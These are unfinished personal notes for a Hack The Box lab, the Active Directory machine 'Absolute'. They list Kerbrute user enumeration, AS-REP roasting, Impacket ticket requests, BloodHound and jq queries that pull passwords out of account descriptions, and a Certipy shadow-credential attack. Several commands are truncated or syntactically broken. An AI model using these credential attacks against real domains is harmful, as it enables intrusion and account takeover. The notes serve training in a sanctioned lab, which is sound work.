# Absolute Helped-Through

Name: Absolute
Date:  
Difficulty:  
Goals:  
Learnt:
Beyond Root:
- Silver, Golden, Diamond and Sapphire Tickets
- Author and manage a Azure Policy for Kerberos and research that
- Make a DC for a Vulnerable machine I want to make - plus the: 
	- Docker containerise windows work station and kubenetes a web app for Vuln machine I want to template out and make
	- Windows Priv HTB academy for Workstation 

Twinned with [[Response-Helped-Through]]

- [[Absolute-Notes.md]]
- [[Absolute-CMD-by-CMDs.md]]


[Ippsec Video](https://www.youtube.com/watch?v=rfAmMQV_wss)
[Alh4zr3d Stream](https://www.twitch.tv/videos/1855594279)
[0xDF Written Writeup](https://0xdf.gitlab.io/2023/05/27/htb-absolute.html)


## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](Screenshots/ping.png)


```bash
# /etc/hosts
$IP DC.absolute.htb absolute.htb
```

```bash
wget -R 
exiftool images/* 
find . -type f -exec exiftool {} \; grep Author | awk -F: '{print $2}' | sed 's/^ //g' > ../users.txt
```

Username Anarchy 
```bash
cp users.txt ua-input.txt
sed -i 's/ /,/g' ua-input.txt
git clone
ruby username-anarchy/username-anarchy -i ua-input.txt -f flast,f.last,first.last,last.first > potential-usernames.txt 
```

```bash
sudo ntpdate -s dc.absolute.htb
# Check
sudo ntpdate dc.absolute.htb
# reset with


```

Kerbrute to enumerate users and get potential ASREProastable users
```bash
git clone
cd kerbrute 
go build

./kerbrute userenum --dc dc.absolute.htb -d absolute.htb potential-usernames.txt -o kerbrute.out
```


```bash
cat kerbrute.out |grep USERNAME | awk '{print $7}' > valid-users.txt
```


```bash
./kerbrute userenum --dc dc.absolute.htb -d absolute.htb valid-users.txt --downgrade -o kerbrute-dg-asreproast.out
```

Impacket can also do this
```
impacket-GetNPUsers
```


```bash
# cme -k kerberos authentication
crackmapexec smb -k -u d.klay -p 
# Either this is protect users account or more likely ntlm is disabled
```

Get TGT for d.klay
```bash
impacket-getTGT
```

BloodHound.py
```bash
KRB5CCNAME=d.klay.ccache /opt/Bloodhound.py/bloodhound.py -k -dc dc.absolute.htb -ns BloodHound.py $IP -c all -d absolute.htb -u d.klay > /tmp/
```


Check BloodHound as knowing the path ahead helps guide us.

Ippsec mentions manual parsing and his video: [Manually Parse Bloodhound Data with JQ to Create Lists of Potentially Vulnerable Users and Computers](https://www.youtube.com/watch?v=o3W4H0UfDmQ)

Bloodhound Debug mode to show Cipher Query
`Settings -> Tick Debug Mode`

Think like a list instead of a graph
```bash
# Convert Integers
(INT|tostring)
# Display all json nicely
cat user.json | jq .
# Put query at the end of the syntax
# Show the Keys 
cat user.json | jq '. | keys'
# Show all the data key
cat user.json | jq '.data'
# Show all the data key as a list - removes the external data{ ..json..}
cat user.json | jq '.data[]'
# Dump all names
cat user.json | jq '.data[].Properties | .name'
# All enabled accounts
cat user.json | jq '.data[].Properties | select( .enabled == true) | .name'
# All disabled accounts
cat user.json | jq '.data[].Properties | select( .enabled == false) | .name'
# All enabled accounts with descriptions may contain passwords
cat user.json | jq '.data[].Properties | select( .enabled == true) | select( .description != null) | .name + " " + .description'
# Enumerating accounts approximate logons and pwdlastset 
# Beware lastlogon is not replicate between DC
# lastlogontimestamp is replicated every two weeks
# Avoid honeypots are never logged in!
# Bruteforce accounts?
cat user.json | jq '.data[].Properties | select( .enabled == true) |  | .name + " " + (.lastlogontimestamp|tostring)'
# Output where pwdlastset is greater 
cat user.json | jq '.data[].Properties | select( .enabled == true) | select(.pwdlastset > .lastlogontimestamp)| .name + " " + (.lastlogontimestamp|tostring) '
# Get all Kerberoastable accounts
cat user.json | jq '.data[].Properties | select( .serviceprinciplenames != []) | .name'

# Show all machines annd there OSes
cat computers.json | jq '.data[].Properties | .name +  ":" + .operatingsystem'
# Find all non Windows 10 pro
cat computers.json | jq '.data[].Properties | select( . operatingsystem != "Windows 10 Pro") |  .name +  ":" + .operatingsystem'

# lastlogontimestamp for machine is the last time that machine was powered on
cat computers.json | jq '.data[].Properties | .name + ":" + (.lastlogintimestamp|tostring)'
# use EpochConverter too convert
# Check which machine have been on compared to a epoch
cat computers.json | jq '.data[].Properties | select( .lastlogintimestamp > $EPOCH) | .name'
```


Get the password
```bash
cat user.json | jq '.data[].Properties | select( .enabled == true) | select( .description != null) | .name + " " + .description'
```


LDAPsearch
```bash
# Provide password
kinit d.klay
/etc/hosts # must have dc.absolute.htb first
ldapsearch -H ldap://dc.absolute.htb -Y GSSAPI -b="cn=users,dc=absolute,dc=htb" "users" "description"
```


Get a ticket for svc_smb account
```bash
impacket-GetTGT absolute.htb/svc_smb
```


```bash
KRB5CCNAME=svc_smb.ccache impacket-smbclient -K absolute.htb/svc_smb@$IP -target-ip $IP
# 
KRB5CCNAME=svc_smb.ccache impacket-smbclient -K absolute.htb/svc_smb@dc.absolute.htb -target-ip $IP
```

Python Virtual environments to manage impacket libraries and versioning
```python
python3 -m venv vmenv

source .env/bin/activate 
pip install .

# deactivate # To deactivate virtual environment
```


Sharing VPN with Window guest to your Linux guest 
```bash
# Check if IP fowarding is enabled 
cat /proc/sys/net/ipv4/ip_forward
# Enable IP forward
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
# Iptables rules 
# INTERFACE is whatever network device that is providing internet to your nic from `ip a`
# INF-IP is INTERFACE ip not include CIDR range
# RANGE is the range choosen or the CIDR range from INTERFACE
sudo iptables -A FORWARD -i tun0 -o $INTERFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i $INTERFACE -o tun0 -j ACCEPT
# Create masquerade/NAT rule to deal with connection not rewriting the ip adderss as Linux box is gateway, but not handling addresses
sudo iptables -t NAT -A POSTROUTING -s INF-IP/RANGE -o tun0 -j MASQUERADE
```

[[Sharp-Helped-Through]] has more verbose instruction

```powershell
# Create route on Windows machine
route add 10.10.10.0/23 mask 255.255.254.0 gw $LINUXIP
```

Ippsec reconfigures a network adapter, but you could also add entries into /etc/hosts on windows
```powershell
C:\Windows\System32\drivers\etc\hosts
```

Wireshark


```powershell
netsh
```


DACLEdit


Certipy to add shadow credential to winrm
```bash
KRB5CCANME=m.lovegod.ccache certipy shadow auto -k -no-pass -u absolute.htb/m.lovegod@dc.absolute.htb -dc-ip $IP --target dc.absolute.htb -account winrm_user
```


KRBRelay 

https://www.youtube.com/watch?v=rfAmMQV_wss 1.15.:50


## Beyond Root


## Testing to then design of Vulnerable Machine(s)

OSCP level Windows and Active Directory Jungle Gym

- Make OSCP level 
- Have good theme
- Make the Kubenetes, docker container only for pivoting not for escaping
- Make uber vulnerable switch once completed
- Ascii Art of completion